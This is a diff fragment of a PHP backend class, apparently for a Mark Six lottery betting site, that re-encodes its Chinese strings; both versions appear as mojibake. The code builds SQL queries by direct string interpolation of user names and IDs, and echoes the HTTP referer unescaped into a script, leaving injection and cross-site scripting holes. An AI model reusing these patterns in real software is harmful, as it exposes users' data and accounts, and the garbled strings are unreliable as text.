             if(!empty($user_name)){
             $user_exists=  $this->select("users", "user_id", "user_name='{$user_name}'");
             $exists = $this->fetch_array($user_exists);
                 if($exists['user_id']){
-                    $str='<font color="blue">è¯¥ç”¨æˆ·åå·²å­˜åœ¨ï¼ï¼ï¼</font>';
+                    $str='<font color="blue">¸ÃÓÃ»§ÃûÒÑ´æÔÚ£¡£¡£¡</font>';
                     $str=iconv("gbk", "utf-8", $str);
                     echo $str;
                 }else{
-                    $str='<font color="green">è¯¥ç”¨æˆ·åå¯ä½¿ç”¨</font>';
+                    $str='<font color="green">¸ÃÓÃ»§Ãû¿ÉÊ¹ÓÃ</font>';
                     $str=iconv("gbk", "utf-8", $str);
                     echo $str;
                 }
@@ -752,13 +752,13 @@ class action extends mysql {
             }
         }
         
-                //è¿”å›ä¿¡ç”¨ä½™é¢
+                //·µ»ØĞÅÓÃÓà¶î
         public function get_top_yue2($user_id){
                 $sql =  $this->select("users", "credit_remainder", "user_id=$user_id");
                 $row =  $this->fetch_array($sql);
                 //echo $row['credit_remainder'];
             //echo $credit_remainder;                
-                $str='<font color="blue">ä¸Šçº§ä½™é¢:&nbsp;'.$row['credit_remainder'].'</font>';
+                $str='<font color="blue">ÉÏ¼¶Óà¶î:&nbsp;'.$row['credit_remainder'].'</font>';
                 //$str=iconv("gbk", "utf-8", $str);
                 return $str;
             //exit;
@@ -856,8 +856,8 @@ class action extends mysql {
 
 	
 	/**
-	 * è®°å½•æ—¥å¿—
-	 *å½“å‰å…­åˆå½©æœŸæ•°(phases)ï¼Œæ“ä½œç”¨æˆ·(ç”¨æˆ·idåŠç”¨æˆ·å)ï¼Œæ“ä½œé¡µé¢ï¼ˆæ ‡é¢˜ï¼‰ï¼Œæ“ä½œæ—¶é—´
+	 * ¼ÇÂ¼ÈÕÖ¾
+	 *µ±Ç°ÁùºÏ²ÊÆÚÊı(phases)£¬²Ù×÷ÓÃ»§(ÓÃ»§id¼°ÓÃ»§Ãû)£¬²Ù×÷Ò³Ãæ£¨±êÌâ£©£¬²Ù×÷Ê±¼ä
 	 */
 	public function caozuorizhi($uid,$username='ww',$title,$is_login = 0,$location="",$tui=0) {
 	if($username!="system"){
@@ -876,7 +876,7 @@ class action extends mysql {
                     $time = mktime();
                     $sql = "INSERT INTO `admin_users_action` SET `phases`= '".$phases."',`title` = '".$newtitle."',`mark` = '".$is_login."',`ip` = '".$ip."',`location` = '".$location."',`uid` = '".$uid."',`datetime` = '".$time."'";
                     $this->query($sql);
-                    //ä¸€æœ‰æ“ä½œå°±è¡¨ç¤ºåœ¨çº¿
+                    //Ò»ÓĞ²Ù×÷¾Í±íÊ¾ÔÚÏß
                     if(empty($tui))
                     $this->query("update users set is_online=1 where user_id=$uid and is_online=0" );
 		}
@@ -884,7 +884,7 @@ class action extends mysql {
 	}
 	
 	 /**
-	 *è®¡ç®—æ“ä½œæ˜¯å¦è¶…æ—¶ 
+	 *¼ÆËã²Ù×÷ÊÇ·ñ³¬Ê± 
 	 */
 	public function skipup($uid,$username,$location="") {
 		if($uid){	
@@ -893,7 +893,7 @@ class action extends mysql {
 		if($is_on['is_ti'] == 1){
 			$sql2 = "update users SET is_online = 0,is_ti=0 where user_id =" .$uid ;
 				$this->query($sql2);
-				$this->caozuorizhi($uid,$username,'ç”¨æˆ·é€€å‡º',2,$location);
+				$this->caozuorizhi($uid,$username,'ÓÃ»§ÍË³ö',2,$location);
 				//session_destroy();
                                 unset($_SESSION['uid'.$this->c_p_seesion()]);
                                 unset($_SESSION['z_uid'.$this->c_p_seesion()]);
@@ -909,13 +909,13 @@ class action extends mysql {
                                 setcookie('user_power'.$this->c_p_seesion(), null);
 				//$url='http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]; 
 				$newurl= $_SERVER['HTTP_REFERER'];
-				echo " <script> alert( 'è¢«ç®¡ç†å‘˜è¸¢å‡ºã€‚ ') ;window.parent.location= '$newurl '; </script> " ;
+				echo " <script> alert( '±»¹ÜÀíÔ±Ìß³ö¡£ ') ;window.parent.location= '$newurl '; </script> " ;
 			}
 		}
 	}
 	
 	/**
-	 *è‡ªåŠ¨è¡¥è´§ 
+	 *×Ô¶¯²¹»õ 
 	 */
 	public function auto_add($up_type,$or_value,$now_value,$location="") {
 		$ip=$_SERVER["REMOTE_ADDR"];
